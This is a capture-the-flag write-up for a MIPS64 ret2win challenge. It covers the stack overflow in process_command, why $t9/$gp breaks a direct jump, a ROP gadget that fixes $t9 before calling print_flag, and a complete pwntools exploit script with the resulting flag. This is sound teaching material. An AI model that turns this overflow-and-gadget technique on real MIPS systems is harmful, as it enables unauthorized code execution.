@@ -1,0 +1,115 @@
+Temporal Rift — MIPS64 ret2win with $t9/$gp‑safe control‑flow
+Author: @solvz
+
+Overview
+Temporal Rift looks like a standard stack overflow at first glance, but it hides a classic MIPS PIC trap: you can control the return address, yet a direct jump to the “win” function crashes because $t9 is wrong and $gp is derived from it. The exploit is therefore not just “overwrite $ra”; it’s “overwrite $ra with a gadget that fixes $t9, then tail‑call win.” This write‑up walks through the reasoning and the final layout.
+
+Binary summary
+- Arch: MIPS64, big‑endian
+- Static binary, not stripped
+- No stack canary
+- NX not required for the solution
+
+Relevant symbols
+- process_command: 0x120004608
+- print_flag:     0x120003f80
+- gadget:         0x1200072d4  (ld $t9, 0x28($sp); jalr $t9)
+
+1) Finding the overflow
+The menu contains a “Send Command” path that calls:
+
+send_command -> process_command
+
+send_command reads up to 0x200 bytes into a stack buffer, then passes that buffer to process_command. Inside process_command, the input is copied into its own local buffer without bounds checks.
+
+Disassembly excerpt (process_command prologue):
+
+  daddiu  $sp, $sp, -0x70
+  sd      $ra, 0x68($sp)
+  sd      $fp, 0x60($sp)
+  sd      $gp, 0x58($sp)
+
+The frame is 0x70 bytes; the saved return address sits at $sp+0x68. Any input longer than 0x68 overwrites $ra, giving control of execution.
+
+2) The MIPS64 PIC pitfall ($t9/$gp)
+On MIPS64, position‑independent functions expect $t9 to contain the function’s entry address. The function prologue uses $t9 to compute $gp. If $t9 is wrong, $gp becomes invalid and the function will crash shortly after entry.
+
+In other words:
+- You can return to print_flag.
+- But if $t9 is not set correctly, print_flag dies.
+
+So the exploit needs a “pivot gadget” that loads $t9 properly before the call.
+
+3) The pivot gadget
+We look for a gadget that:
+- loads $t9 from a stack location
+- does jalr $t9
+
+A suitable gadget exists at:
+
+0x1200072d4:
+  ld   $t9, 0x28($sp)
+  ...
+  jalr $t9
+
+This is ideal: we can place print_flag on the stack and have the gadget fetch it into $t9 before jumping.
+
+4) Stack layout math
+At process_command return:
+- $sp is restored to S + 0x70
+- $ra is popped from S + 0x68
+
+If we return into the gadget, it will read $t9 from:
+
+($sp + 0x28) = (S + 0x70 + 0x28) = S + 0x98
+
+Therefore:
+- Overwrite $ra at offset 0x68 with gadget address
+- Place print_flag at offset 0x98
+
+5) Payload layout
+
+offset 0x00: "PING" (valid command prefix)
+offset 0x04..0x67: padding
+offset 0x68: gadget (ld $t9, 0x28($sp); jalr $t9)
+offset 0x98: print_flag
+
+6) Final exploit (pwntools)
+
+from pwn import *
+
+context.arch = 'mips64'
+context.endian = 'big'
+context.bits = 64
+
+HOST = 'node-2.mcsc.space'
+PORT = 12238
+
+PRINT_FLAG = 0x120003f80
+GADGET     = 0x1200072d4
+
+offset_ra = 0x68
+offset_t9 = 0x98
+
+payload  = b"PING"
+payload += b"A" * (offset_ra - 4)
+payload += p64(GADGET)
+payload += b"B" * (offset_t9 - (offset_ra + 8))
+payload += p64(PRINT_FLAG)
+
+io = remote(HOST, PORT)
+io.sendlineafter(b">>> ", b"3")
+io.sendlineafter(b">>> ", payload)
+io.interactive()
+
+7) Result
+The target prints:
+
+ACCESS GRANTED - CLASSIFIED TRANSMISSION LOG:
+esch{shellcode-is-contextual-nova-orbit-2384}
+
+Why this works (in one sentence)
+We don’t just redirect control flow; we redirect it through a gadget that restores the MIPS PIC contract ($t9 -> $gp), so print_flag can execute normally.
+
+Closing note
+This is a clean example of how “ret2win” on MIPS is not just about the return address—$t9 correctness is the difference between a crash and a flag. The fix is simple once you know what to look for, but it’s an easy trap if you’ve only exploited x86_64.
